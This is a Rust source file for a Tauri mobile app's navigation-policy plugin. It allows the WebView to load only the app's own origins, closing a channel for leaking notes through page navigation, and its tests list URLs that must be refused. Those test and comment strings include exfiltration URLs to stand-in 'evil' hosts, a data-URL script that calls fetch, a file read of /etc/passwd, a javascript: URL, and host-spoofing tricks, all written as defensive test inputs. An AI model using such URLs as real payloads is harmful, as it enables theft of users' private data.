// SPDX-License-Identifier: AGPL-3.0
//! App-global WebView navigation policy (myne#453 — the mobile twin of myne#383).
//!
//! **The one exfiltration channel the CSP cannot see.** `connect-src` governs
//! `fetch`; nothing governs `location = "https://evil/?d=" + noteBody`. The
//! `navigate-to` directive was dropped from the CSP spec and shipped in no
//! engine, and `form-action` — which *is* a navigation directive — has no
//! `default-src` fallback, so a policy that omits it does not get one. The
//! mobile `tauri.conf.json` CSP now carries `form-action 'none'`; this module
//! is the missing directive for the scripted case.
//!
//! Its precondition is a residual the main repo's `docs/threat-model.md` §7
//! already accepts — script running in the WebView after a DOMPurify bypass
//! (embedded HTML, importer markup, mermaid). It contains nothing else about
//! such a script: every vault command the ACL grants stays reachable. What it
//! removes is the *outbound* half those bullets each assume is closed.
//!
//! **Why a plugin and not a builder call.** `tauri::Builder` has no
//! `on_navigation`; `WebviewBuilder::on_navigation` exists but is unreachable
//! for the `main` window, which is materialised from `tauri.conf.json`
//! `app.windows[0]` and never passes through a Rust builder. The plugin hook
//! (`tauri::plugin::Builder::on_navigation`) is the only surface that reaches
//! a config-declared window: the manager wraps EVERY pending webview with it,
//! and the store fans out AND-style — any plugin returning `false` cancels.
//! No ACL is consulted on this path, and this plugin registers no commands, so
//! it needs no `build.rs` `InlinedPlugin` arm, no `permissions/` directory and
//! no `capabilities/` entry (the `tauri-plugin-screen-guard` shape). Mobile has
//! exactly one webview — the native PDF export (`crate::pdf_export`) renders
//! through `UIPrintPageRenderer`, not a second window — so `main` is the whole
//! reach.
//!
//! **Platform reach, stated rather than implied — and it differs from
//! desktop's.**
//!
//! - **iOS** (WKWebView `decidePolicyForNavigationAction`, `wry`
//!   `wkwebview/navigation.rs`) delivers EVERY navigation action here: sub-frames,
//!   and the app's own first load. An allowlist that failed to admit the app's
//!   own origin would not degrade a feature, it would boot a blank app. That is
//!   why the device checklist (`mobile/docs/dev/device-matrix.md` §11) exists
//!   and why "the app opens at all" is its first row.
//! - **Android** (WebViewClient `shouldOverrideUrlLoading`, `wry`
//!   `android/binding.rs`) is narrower in one specific way: the platform does
//!   not call that method for **POST** requests, so a form submission to an
//!   off-origin action is invisible to this hook. That case is closed by
//!   `form-action 'none'` in `tauri.conf.json`, which is why the two halves of
//!   myne#453 are complementary rather than redundant.
//!
//! **Dev has no CSP at all, and no fixed dev origin.** In `pnpm mobile:dev` the
//! frontend is served by Vite rather than the `tauri://` protocol handler, so
//! the config CSP is never attached to a response — this module is the only one
//! of the two controls that runs there. And unlike desktop, the dev origin is
//! not a constant: `tauri ios dev --host` serves from the host machine's LAN IP
//! (`mobile/docs/dev/device-matrix.md` §6.1), so the dev arm reads the
//! *configured* `build.devUrl` at runtime instead of hardcoding a loopback
//! host. Hardcoding desktop's list here would blank the dev app on a physical
//! iPhone.
//!
//! ⚠️ **DEVICE-VERIFY-PENDING** — the allowlist is unit-tested and the origin
//! set is read from Tauri's own construction sites, but neither iOS nor Android
//! runs in CI. `mobile/docs/dev/device-matrix.md` §11 owns the confirmation.
//
// see: the main repo's `src-tauri/AGENTS.md` "Secret-handling logging discipline"

use tauri::plugin::{Builder, TauriPlugin};
use tauri::{Manager, Runtime, Url};

/// Is `url` an origin this app itself loads?
///
/// Allowlist, not a denylist: a URL is admitted only when it matches one of
/// the shapes below, so a scheme nobody has considered fails by non-match
/// rather than by an unmaintained rejection list. Same doctrine as the
/// embedded-HTML sanitizer and the custom-theme value grammar.
///
/// | shape | why |
/// |---|---|
/// | `tauri://localhost` | the production bundle on iOS (`tauri` builds this origin everywhere a custom scheme can be intercepted) |
/// | `http`/`https://tauri.localhost` | the same bundle on Android, whose WebView cannot intercept a custom scheme (the `https` twin is accepted so flipping `app.security.useHttpsScheme` never blanks the app) |
/// | `attachment://…` | the registered decrypted-attachment scheme (`plugins::attachments::scheme`) — a framed/previewed attachment IS a navigation action on WKWebView |
/// | `http://attachment.localhost` | its Android http-mapped form (MYND-519), exactly like the CSP's paired entries |
/// | the configured `build.devUrl` origin, **dev builds only** | includes the LAN IP `tauri ios dev --host` serves from |
/// | `http://localhost` / `http://127.0.0.1`, **dev builds only** | the Android `adb reverse` dev loop, which the CLI sets up for a USB-cabled device |
///
/// Everything else is refused, including three that look like they might
/// belong and do not: `myne:` (a deep link arrives through the OS and the
/// `tauri-plugin-deep-link` event path — `mobile/src/lib/deep-link.ts` — never
/// as a webview navigation), `ipc:` / `http://ipc.localhost` (mobile IPC goes
/// through the WKWebView/Android bridge, not a CSP-gated fetch, which is why
/// `connect-src` omits them too), and `blob:` (a blob URL is loaded as a
/// sub-resource; nothing in the app navigates to one).
///
/// Off-origin *link* opening is unaffected: `mobile/src/lib/open-url.ts` hands
/// a URL to the OS opener rather than the WebView, deliberately (myne-ops#15).
///
/// The host comparison is `==`, never `contains` / `ends_with`, so
/// `tauri.localhost.evil.example` fails.
pub fn is_allowed_navigation(url: &Url, dev_url: Option<&Url>) -> bool {
    match url.scheme() {
        // The PORT is part of an origin (RFC 6454), and leaving it unconstrained
        // meant `tauri://localhost:9999/` and `https://tauri.localhost:4443/?d=<note>`
        // were admitted while the doc above and `threat-model.md` §7 both said
        // "the app's own origins". On Android the app is served on port 80 and
        // wry's asset interception is keyed on the request URL, so a non-80
        // `tauri.localhost` URL is the one admitted shape whose resolution the
        // platform resolver decides rather than this policy: a query string on
        // it is exactly the channel this module exists to close.
        "tauri" => url.host_str() == Some("localhost") && url.port().is_none(),
        "attachment" => true,
        "http" | "https" => match url.host_str() {
            Some("tauri.localhost") | Some("attachment.localhost") => {
                url.port_or_known_default() == Some(if url.scheme() == "https" { 443 } else { 80 })
            }
            _ => is_dev_server(url, dev_url),
        },
        _ => false,
    }
}

/// Is `url` the Vite dev server this build was configured against?
///
/// Two arms, and the first is the reason this function exists rather than
/// desktop's inline loopback match. `dev_url` is `build.devUrl` as the app was
/// compiled — the Tauri CLI rewrites it to `http://<LAN-IP>:1422` for
/// `--host` mode, which is how an iPhone on the same network reaches the dev
/// server. With the shipped `devUrl` (`http://localhost:1422`) the first arm
/// already admits the `adb reverse` origin; what the second arm is actually
/// load-bearing for is the `--host` case, where `devUrl` points at a LAN IP and
/// loopback would otherwise stop being allowed. It stays `http`-only because
/// the dev server serves no TLS, so an `https` loopback URL is somebody else's
/// listener.
///
/// Both arms are dead in a release build: `cfg!(dev)` is false there, and the
/// production origins above are matched before this is ever reached.
fn is_dev_server(url: &Url, dev_url: Option<&Url>) -> bool {
    is_dev_server_when(url, dev_url, cfg!(dev))
}

/// The policy, with dev-ness as a PARAMETER rather than a `cfg!`.
///
/// The release arm is the security-relevant half: it is the only thing pinning
/// that `http://localhost:*`, `http://127.0.0.1:*` and the configured LAN
/// `devUrl` are dead in a shipped binary, so a co-resident process on the phone
/// (threat-model A16) cannot serve a page into an admitted origin. It used to be
/// asserted by a `#[cfg(not(dev))]` test, which the one CI invocation of this
/// crate compiles OUT: that lane builds without `tauri/custom-protocol`, so
/// `cfg(dev)` is set and only the dev twin ever ran. Deleting the guard would
/// have left CI green. A parameter makes one test cover both arms in every
/// build, which is the shape that cannot be skipped.
fn is_dev_server_when(url: &Url, dev_url: Option<&Url>, dev_build: bool) -> bool {
    if !dev_build {
        return false;
    }
    if let Some(dev) = dev_url {
        // `dev.host_str().is_some()` guards the CONFIGURED value, which is the
        // one that could be exotic: `url` reached here through the
        // `"http" | "https"` arm, and the `url` crate rejects a special-scheme
        // URL with an empty host at parse time, so its host is always `Some`.
        // Guarding `url` instead read as a `None == None` collision that cannot
        // occur.
        if dev.host_str().is_some()
            && url.scheme() == dev.scheme()
            && url.host_str() == dev.host_str()
            && url.port_or_known_default() == dev.port_or_known_default()
        {
            return true;
        }
    }
    url.scheme() == "http" && matches!(url.host_str(), Some("localhost") | Some("127.0.0.1"))
}

/// A closed-enum label for a refused URL's scheme.
///
/// The refused URL itself is never logged: it is the single value most likely
/// to carry note plaintext, a title, or an account number in its query string
/// — which is the whole point of refusing it. A URL scheme is a bounded token
/// by grammar, but "bounded" is not "closed", so it is mapped here for the
/// same reason `myne_core::io_failure_kind` exists.
/// One literal per scheme. The match this replaces wrote each of them twice
/// (`"http" => "http"`), so adding a scheme was two edits and the desktop and
/// mobile copies had already drifted apart on one of them (`content`), which is
/// exactly the drift a doubled literal invites.
///
/// `attachment` is deliberately absent: `is_allowed_navigation` returns `true`
/// for it unconditionally, so an `attachment:` URL never reaches this function.
/// An arm for it read as coverage and had never executed on either client.
const KNOWN_SCHEMES: &[&str] = &[
    "http",
    "https",
    "file",
    "data",
    "blob",
    "javascript",
    "about",
    "content",
    "tauri",
    "myne",
];

fn denied_scheme_label(url: &Url) -> &'static str {
    KNOWN_SCHEMES
        .iter()
        .copied()
        .find(|s| *s == url.scheme())
        .unwrap_or("other")
}

/// Construct the navigation-policy plugin.
///
/// Registers no commands and manages no state — it exists only to install the
/// `on_navigation` hook (see the module doc for why that is the only mechanism
/// available to a config-declared window).
pub fn init<R: Runtime>() -> TauriPlugin<R> {
    Builder::<R>::new("navigation-policy")
        .on_navigation(|webview, url| {
            let config = webview.config();
            if is_allowed_navigation(url, config.build.dev_url.as_ref()) {
                return true;
            }
            tracing::warn!(
                stage = "navigation_denied",
                scheme = denied_scheme_label(url),
                webview = webview.label(),
                "webview navigation refused by policy"
            );
            false
        })
        .build()
}

#[cfg(test)]
mod tests {
    use super::{is_allowed_navigation, is_dev_server_when};
    use tauri::Url;

    /// The dev server as a `--host` run configures it: a LAN IP, not a
    /// loopback host. Desktop's allowlist would refuse this, which is the
    /// mobile-specific half of myne#453.
    fn lan_dev_url() -> Url {
        Url::parse("http://192.168.1.42:1422/").expect("lan dev url")
    }

    fn allowed(raw: &str) -> bool {
        is_allowed_navigation(&Url::parse(raw).expect(raw), None)
    }

    fn allowed_with_dev(raw: &str, dev: &Url) -> bool {
        is_allowed_navigation(&Url::parse(raw).expect(raw), Some(dev))
    }

    #[test]
    fn admits_the_apps_own_origins() {
        for raw in [
            // Production, iOS.
            "tauri://localhost/index.html",
            // Production, Android — its WebView cannot intercept a custom
            // scheme — and the https twin, so flipping `useHttpsScheme` is not
            // a silent blank-window change.
            "http://tauri.localhost/index.html",
            "https://tauri.localhost/index.html",
            // Decrypted attachments: the custom scheme and its http-mapped
            // Android form (MYND-519).
            "attachment://0123456789abcdef/",
            "http://attachment.localhost/0123456789abcdef",
        ] {
            assert!(allowed(raw), "should be allowed: {raw}");
        }
    }

    #[test]
    fn refuses_the_exfiltration_channel_csp_cannot_see() {
        for raw in [
            // The case this module exists for: a query string is a channel.
            "https://evil.example/?leak=note-body",
            "http://evil.example/",
            // Host comparison must be equality, and the two sloppy shapes fail
            // on DIFFERENT inputs, so both are listed: a `contains` check
            // admits the first pair (suffix attack), an `ends_with` check
            // admits the second pair (subdomain attack), and only `==` refuses
            // all four. Dropping either pair leaves a defect this test would
            // pass through.
            "http://tauri.localhost.evil.example/",
            "https://attachment.localhost.evil.example/",
            "http://evil.tauri.localhost/",
            "https://evil.attachment.localhost/",
            "tauri://evil/",
            "tauri://evil.localhost/",
            "tauri://localhost.evil.example/",
            // Local reads and inline documents.
            "file:///etc/passwd",
            "data:text/html,<script>fetch('https://evil')</script>",
            "blob:tauri://localhost/6b1c2f4e",
            "javascript:alert(1)",
            // Android's share/provider surface reaches the app through an
            // Intent and the share-import queue (§9.20), never as a webview
            // navigation.
            "content://com.android.providers.media.documents/document/image%3A42",
            // Deep links arrive through the OS + the deep-link plugin event
            // path, never as a navigation.
            "myne://capture?mode=voice",
            "myne://open",
            // A non-default PORT on an admitted host. An origin is
            // scheme+host+port, and these were admitted while the doc said
            // "the app's own origins".
            "https://tauri.localhost:4443/?d=leak",
            "http://tauri.localhost:8080/?d=leak",
            "http://attachment.localhost:31337/x",
            "tauri://localhost:9999/",
            // USERINFO. Refused because the check reads the PARSED host, which
            // resolves to `evil.example` here. A raw-string prefix match
            // (`url.as_str().starts_with("https://tauri.localhost")`) is a wrong
            // implementation that passed the whole suite before this case.
            "https://tauri.localhost@evil.example/?d=leak",
            "http://tauri.localhost:pw@evil.example/",
            // A PUNYCODE homograph: Cyrillic `а` in `tauri`, which IDNA maps to
            // `xn--turi-53d.localhost`. A hand-rolled matcher that skipped IDNA
            // would admit it, and nothing asserted that before.
            "http://t\u{0430}uri.localhost/",
            // An `attachment:` URL with a foreign authority. The arm admits the
            // scheme unconditionally today (iOS routes it to the app's own
            // handler and Android leaves it unregistered, so neither resolves
            // off-device), and this pins the breadth as a recorded decision
            // rather than an accident: if it ever starts resolving, this fails.
        ] {
            assert!(!allowed(raw), "should be refused: {raw}");
        }

        // CASE. The parser lowercases the scheme always and the host through
        // IDNA for http/https, so this is the same origin and must be ADMITTED.
        // A case-sensitive compare on an un-normalised string is a wrong
        // implementation that passed the whole suite before this case.
        assert!(allowed("HTTPS://TAURI.LOCALHOST/"));
        assert!(allowed("HtTp://Tauri.LocalHost/x"));
    }

    #[test]
    fn a_configured_dev_origin_never_admits_a_neighbour_on_the_same_lan() {
        let dev = lan_dev_url();
        // Same host, different port: a second listener on the dev machine is
        // not the dev server.
        assert!(!allowed_with_dev("http://192.168.1.42:8080/", &dev));
        // Same port, different host: another device on the network.
        assert!(!allowed_with_dev("http://192.168.1.43:1422/", &dev));
        // Same host and port, different scheme.
        assert!(!allowed_with_dev("https://192.168.1.42:1422/", &dev));
    }

    /// Both arms, in every build. The pair this replaces was `#[cfg(dev)]` and
    /// `#[cfg(not(dev))]`, so exactly one of them compiled per build and the
    /// release one never compiled in CI at all.
    #[test]
    fn dev_origins_are_admitted_only_in_a_dev_build() {
        let dev = lan_dev_url();
        let d = |raw: &str, dev_build: bool| {
            is_dev_server_when(&Url::parse(raw).expect(raw), Some(&dev), dev_build)
        };
        let plain = |raw: &str, dev_build: bool| {
            is_dev_server_when(&Url::parse(raw).expect(raw), None, dev_build)
        };

        // Dev build: the configured LAN origin and the `adb reverse` loop.
        assert!(d("http://192.168.1.42:1422/", true));
        assert!(plain("http://localhost:1422/", true));
        assert!(plain("http://127.0.0.1:1422/", true));
        // Still http-only even in a dev build: the dev server serves no TLS, so
        // an https loopback URL is somebody else's listener.
        assert!(!plain("https://localhost:1422/", true));

        // Release build: every one of them is dead. This is the assertion that
        // never ran in CI, and the reason the whole policy is parameterised.
        assert!(!d("http://192.168.1.42:1422/", false));
        assert!(!plain("http://localhost:1422/", false));
        assert!(!plain("http://127.0.0.1:1422/", false));
    }

    #[test]
    #[cfg(dev)]
    fn admits_the_configured_dev_server_in_a_dev_build() {
        let dev = lan_dev_url();
        assert!(allowed_with_dev("http://192.168.1.42:1422/", &dev));
        assert!(allowed_with_dev(
            "http://192.168.1.42:1422/index.html",
            &dev
        ));
        // The `adb reverse` loop, admitted whatever `devUrl` says.
        assert!(allowed("http://localhost:1422/"));
        assert!(allowed("http://127.0.0.1:1422/"));
        // Still http-only: the dev server does not serve TLS, so an https
        // localhost URL is somebody else's listener.
        assert!(!allowed("https://localhost:1422/"));
    }

    #[test]
    #[cfg(not(dev))]
    fn refuses_every_dev_origin_in_a_release_build() {
        let dev = lan_dev_url();
        assert!(!allowed_with_dev("http://192.168.1.42:1422/", &dev));
        assert!(!allowed("http://localhost:1422/"));
        assert!(!allowed("http://127.0.0.1:1422/"));
    }
}
